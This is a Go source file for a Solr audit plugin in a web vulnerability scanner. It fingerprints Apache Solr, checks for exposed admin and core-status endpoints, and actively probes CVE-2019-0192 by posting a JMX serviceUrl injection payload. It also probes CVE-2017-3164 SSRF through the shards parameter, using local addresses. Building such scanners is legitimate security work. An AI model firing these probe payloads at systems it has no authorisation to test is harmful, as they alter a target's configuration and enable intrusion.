/**
* @Author: shaochuyu
* @Date: 6/16/2026
 */
package solraudit

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	logger "wscan/core/utils/log"
)

// Config Solr 审计插件配置
type Config struct {
	base.PluginBaseConfig `json:",inline" yaml:",inline"`
}

func (c *Config) BaseConfig() *base.PluginBaseConfig {
	return &c.PluginBaseConfig
}

// SolrAudit Solr 审计插件
type SolrAudit struct {
	base.PluginMixinInitConfig
	base.PluginMixinClose
}

func (*SolrAudit) Close() error { return nil }

func (*SolrAudit) DefaultConfig() base.PluginConfigInterface {
	return &Config{
		PluginBaseConfig: base.PluginBaseConfig{Name: "solr-audit", Enabled: true},
	}
}

func (p *SolrAudit) GetConfig() base.PluginConfigInterface {
	return p.PluginMixinInitConfig.GetConfig()
}

func (p *SolrAudit) Init(ctx context.Context, pci base.PluginConfigInterface, ab *base.ApolloBase) error {
	logger.Debug("SolrAudit plugin init")
	return p.PluginMixinInitConfig.Init(ctx, pci, ab)
}

// doRequest sends an HTTP request and returns the request, response, and error.
func doRequest(apollo *base.Apollo, method, rawURL string) (*http.Request, *http.Response, error) {
	req, err := http.NewRequest(method, rawURL, nil)
	if err != nil {
		return nil, nil, err
	}
	resp, err := apollo.HTTPClient.Respond(context.Background(), req)
	if err != nil {
		return nil, nil, err
	}
	return req, resp, nil
}

// doRequestWithJSON sends a POST request with JSON body.
func doRequestWithJSON(apollo *base.Apollo, rawURL string, body string) (*http.Request, *http.Response, error) {
	req, err := http.NewRequest("POST", rawURL, strings.NewReader(body))
	if err != nil {
		return nil, nil, err
	}
	req.SetHeader("Content-Type", "application/json")
	resp, err := apollo.HTTPClient.Respond(context.Background(), req)
	if err != nil {
		return nil, nil, err
	}
	return req, resp, nil
}

// makeVuln creates and outputs a vulnerability.
func makeVuln(apollo *base.Apollo, req *http.Request, resp *http.Response, vulnID, category, payload string, extra map[string]any) {
	v := apollo.NewWebVuln(req, resp, nil)
	if v == nil {
		return
	}
	v.SetTargetURL(req.URL())
	v.Payload = payload
	if extra != nil {
		for k, val := range extra {
			v.Extra[k] = val
		}
	}
	apollo.OutputVuln(v)
}

// solrCoresResponse represents the response from Solr admin cores endpoint.
type solrCoresResponse struct {
	ResponseHeader struct {
		Status int `json:"status"`
		QTime  int `json:"QTime"`
	} `json:"responseHeader"`
	Status map[string]struct {
		Name string `json:"name"`
	} `json:"status"`
}

// detectSolrFingerprint checks if the target is a Solr instance and returns core names.
func detectSolrFingerprint(apollo *base.Apollo, baseURL string) ([]string, string, *http.Request, *http.Response) {
	// Try modern Solr endpoint first: /solr/admin/cores?wt=json
	endpoints := []string{
		"/solr/admin/cores?wt=json",
		"/admin/cores?wt=json",
		"/solr/admin/",
	}

	for _, endpoint := range endpoints {
		rawURL := http.UrlJoinPath(baseURL, endpoint)
		req, resp, err := doRequest(apollo, "GET", rawURL)
		if err != nil {
			continue
		}

		// Handle 301 redirect for older Solr versions
		if resp.StatusCode == 301 {
			continue
		}

		if resp.StatusCode != 200 {
			continue
		}

		body := resp.Text

		// Check for Solr JSON response pattern
		if strings.Contains(body, `"responseHeader"`) && strings.Contains(body, `"status"`) {
			var coresResp solrCoresResponse
			if err := json.Unmarshal([]byte(body), &coresResp); err == nil {
				coreNames := []string{}
				for name := range coresResp.Status {
					coreNames = append(coreNames, name)
				}
				return coreNames, body, req, resp
			}
		}

		// Check for older Solr admin page
		if strings.Contains(body, "Schema Browser") || strings.Contains(body, "schema.jsp") {
			return nil, body, req, resp
		}

		// Check for Solr general patterns
		if strings.Contains(body, "Solr") && strings.Contains(body, "Lucene") {
			return nil, body, req, resp
		}
	}

	return nil, "", nil, nil
}

// extractSolrVersion tries to extract Solr version from response body.
func extractSolrVersion(body string) string {
	// Common patterns in Solr responses
	patterns := []string{
		// Look for version in Solr admin page
		`"lucene-spec-version":"`,
		`"lucene-implementat`,
	}

	for _, pattern := range patterns {
		idx := strings.Index(body, pattern)
		if idx != -1 {
			// Extract value after the pattern
			start := idx + len(pattern)
			// Find the end of the value (next quote)
			end := strings.Index(body[start:], `"`)
			if end != -1 {
				return body[start : start+end]
			}
		}
	}
	return ""
}

func (p *SolrAudit) Fingers() []*base.Finger {
	return []*base.Finger{
		// Solr 暴露检测
		{
			Channel: "website",
			Binding: &model.VulnBinding{
				ID:       "solr_exposed",
				Plugin:   "solraudit",
				Category: "solr_exposed",
				Severity: model.SeverityHigh,
			},
			CheckAction: func(ctx context.Context, apollo *base.Apollo) error {
				flow := apollo.GetTargetFlow()
				if flow == nil || flow.Request == nil {
					return fmt.Errorf("no flow available")
				}
				return nil
			},
			ExecAction: func(ctx context.Context, apollo *base.Apollo) error {
				flow := apollo.GetTargetFlow()
				if flow == nil || flow.Request == nil {
					return nil
				}
				baseURL := flow.Request.URL().String()

				// Step 1: Fingerprint detection
				coreNames, body, fingerReq, fingerResp := detectSolrFingerprint(apollo, baseURL)
				if fingerReq == nil {
					return nil
				}

				extra := map[string]any{}
				version := extractSolrVersion(body)
				if version != "" {
					extra["version"] = version
				}
				if len(coreNames) > 0 {
					extra["cores"] = coreNames
				}
				makeVuln(apollo, fingerReq, fingerResp, "solr_exposed", "solr_exposed",
					"Apache Solr instance exposed", extra)

				// Step 2: Check exposed admin panel
				adminPaths := []string{
					"/solr/admin/",
					"/solr/#/",
				}
				for _, adminPath := range adminPaths {
					adminURL := http.UrlJoinPath(baseURL, adminPath)
					adminReq, adminResp, err := doRequest(apollo, "GET", adminURL)
					if err != nil || adminResp.StatusCode != 200 {
						continue
					}
					if strings.Contains(adminResp.Text, "Solr") || strings.Contains(adminResp.Text, "Solr Admin") {
						makeVuln(apollo, adminReq, adminResp, "solr_admin_exposed", "solr_admin_exposed",
							"Solr admin panel accessible at "+adminPath, map[string]any{
								"admin_path": adminPath,
							})
					}
				}

				// Step 3: Core discovery via STATUS action
				coresURL := http.UrlJoinPath(baseURL, "/solr/admin/cores?action=STATUS&wt=json")
				coresReq, coresResp, err := doRequest(apollo, "GET", coresURL)
				if err == nil && coresResp.StatusCode == 200 {
					if strings.Contains(coresResp.Text, `"responseHeader"`) {
						makeVuln(apollo, coresReq, coresResp, "solr_cores_accessible", "solr_cores_accessible",
							"Solr cores status accessible", map[string]any{
								"cores_data": coresResp.Text,
							})
					}
				}

				// Step 4: CVE-2019-0192 - DataImportHandler JMX RCE
				// This requires knowing a core name to test
				if len(coreNames) > 0 {
					for _, coreName := range coreNames {
						// Check DataImportHandler exposure
						dihURL := http.UrlJoinPath(baseURL, "/solr/"+coreName+"/dataimport")
						dihReq, dihResp, err := doRequest(apollo, "GET", dihURL)
						if err == nil && dihResp.StatusCode == 200 {
							if strings.Contains(dihResp.Text, "DataImportHandler") || strings.Contains(dihResp.Text, "dataimport") {
								makeVuln(apollo, dihReq, dihResp, "CVE-2019-0192_check", "solr_dih_exposed",
									"DataImportHandler exposed for core "+coreName, map[string]any{
										"core":        coreName,
										"cve":         "CVE-2019-0192",
										"description": "DataImportHandler JMX service URL injection may allow RCE",
									})

								// Test JMX service URL injection (CVE-2019-0192)
								jmxPayload := fmt.Sprintf(`{"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://127.0.0.1:1099/obj"}}`)
								jmxURL := http.UrlJoinPath(baseURL, "/solr/"+coreName+"/config/jmx")
								jmxReq, jmxResp, err := doRequestWithJSON(apollo, jmxURL, jmxPayload)
								if err == nil && jmxResp.StatusCode == 200 {
									makeVuln(apollo, jmxReq, jmxResp, "CVE-2019-0192", "solr_rce",
										"JMX service URL injection possible (CVE-2019-0192)", map[string]any{
											"core":        coreName,
											"cve":         "CVE-2019-0192",
											"description": "Solr DataImportHandler JMX service URL injection allows remote code execution",
										})
								}
							}
						}
					}
				}

				// Step 5: SSRF via shards parameter (CVE-2017-3164)
				// Test if shards parameter is accepted
				if len(coreNames) > 0 {
					coreName := coreNames[0]
					// Test with a local/internal URL to see if shards parameter is processed
					shardURL := http.UrlJoinPath(baseURL, "/solr/"+coreName+"/select?shards=localhost:8983/solr/"+coreName+"&q=*:*&wt=json")
					shardReq, shardResp, err := doRequest(apollo, "GET", shardURL)
					if err == nil && shardResp.StatusCode == 200 {
						if strings.Contains(shardResp.Text, `"responseHeader"`) {
							makeVuln(apollo, shardReq, shardResp, "solr_ssrf_shards", "solr_ssrf",
								"Solr shards parameter SSRF possible (CVE-2017-3164)", map[string]any{
									"core":        coreName,
									"cve":         "CVE-2017-3164",
									"description": "Solr shards parameter can be used for SSRF attacks",
								})
						}
					}
				}

				return nil
			},
		},
	}
}
